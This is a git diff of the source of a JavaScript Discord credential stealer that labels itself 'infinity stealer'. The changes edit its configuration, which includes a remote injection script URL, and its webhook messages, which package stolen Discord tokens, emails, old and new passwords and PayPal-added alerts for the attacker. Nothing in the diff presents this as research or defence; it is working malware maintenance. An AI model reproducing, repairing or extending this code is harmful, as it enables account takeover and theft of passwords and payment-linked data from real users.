@@ -12,7 +12,7 @@ const config = {
   ping_on_run: false, 
   ping_val: '@everyone', 
   embed_name: 'infinity stealer', 
-  embed_icon: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
+  embed_icon: 'https://cdn.discordapp.com/avatars/676976206876377099/111fc5a53441fffa1516f6114620f888.png?size=2048',
   embed_color: 000000, 
   injection_url: 'https://raw.githubusercontent.com/fernanda1233/xd2/master/index.js',
   api: 'https://discord.com/api/v9/users/@me',
@@ -611,7 +611,7 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '<a:944007295417843743:959785231982931979> Token:',
-            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/${token}):${password}`,
+            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
           },
           {
@@ -653,7 +653,7 @@ const login = async (email, password, token) => {
           text: 'infinity stealer',
         },
         thumbnail: {
-          url: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
+          url: 'https://cdn.discordapp.com/avatars/676976206876377099/111fc5a53441fffa1516f6114620f888.png?size=2048',
         },
       },
     ],
@@ -676,7 +676,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}** [Click to copy](https://superfurrycdn.nl/copy/${token}):${newpassword}`,
+            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}** [Click to copy](https://superfurrycdn.nl/copy/${token})`,
             inline: true,
           },
           {
@@ -755,7 +755,7 @@ const PaypalAdded = async (token) => {
     username: config.embed_name,
     avatar_url: config.embed_icon,
     embeds: [
-      {
+      { 
         color: config.embed_color,
         fields: [
           {
